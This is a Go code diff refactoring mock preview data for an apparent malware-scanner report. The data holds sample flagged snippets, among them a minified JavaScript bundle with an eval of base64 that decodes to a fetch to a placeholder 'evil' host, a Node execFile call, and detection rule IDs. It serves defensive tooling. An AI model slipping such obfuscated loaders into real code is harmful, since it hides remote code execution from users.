@@ -62,7 +62,7 @@ func previewData() resultData {
 	d.RiskLevel = "hostile"
 	d.RiskLabel = "Hostile"
 	d.IsArchive = true
-	d.Level = testInt(72)
+	d.Level = new(72)
 	d.LevelConfidence = 91
 	d.Size = "8.4 KB"
 
@@ -78,8 +78,10 @@ func previewData() resultData {
 			{26, "execFile('node', [payload], cb);", []ctxNote{{ID: "process/create/system::js-execfile-direct-call", Desc: "Executes file via Node.js execFile", Off: 0, Len: 8, Crit: 5}}},
 		}),
 		jsMember(4, "bundle.min.js", "eee", "javascript", []ctxLine{
-			{1, "!function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}n.m=e;var a=eval(atob(\"ZmV0Y2goJ2h0dHBzOi8vZXZpbCcp\"));return n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},a}([])",
-				[]ctxNote{{ID: "execution/interpreter/eval::obfuscated", Desc: "eval of base64-decoded payload", Off: 196, Len: 23, Crit: 5}}},
+			{
+				1, "!function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}n.m=e;var a=eval(atob(\"ZmV0Y2goJ2h0dHBzOi8vZXZpbCcp\"));return n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},a}([])",
+				[]ctxNote{{ID: "execution/interpreter/eval::obfuscated", Desc: "eval of base64-decoded payload", Off: 196, Len: 23, Crit: 5}},
+			},
 		}),
 		hexMember(3, "libpayload.so", "ddd", 0x10010),
 		hexMember(5, "stub.bin", "fff", 0x40),
@@ -142,7 +144,7 @@ func hexMember(id int, name, sha string, base int64) cleaveFile {
 	for i := range data {
 		data[i] = byte(0x20 + (i*7)%90)
 	}
-	copy(data, []byte("\x7fELF\x02\x01\x01"))
+	copy(data, "\x7fELF\x02\x01\x01")
 	notes := []ctxNote{
 		{ID: "net/resolve::getnameinfo", Desc: "Resolve endpoint with getnameinfo", Off: base + 0x10, Len: 8, Crit: 3},
 		{ID: "account/enumerate::lookup", Desc: "Enumerate account names from IDs", Off: base + 0x14, Len: 8, Crit: 4},
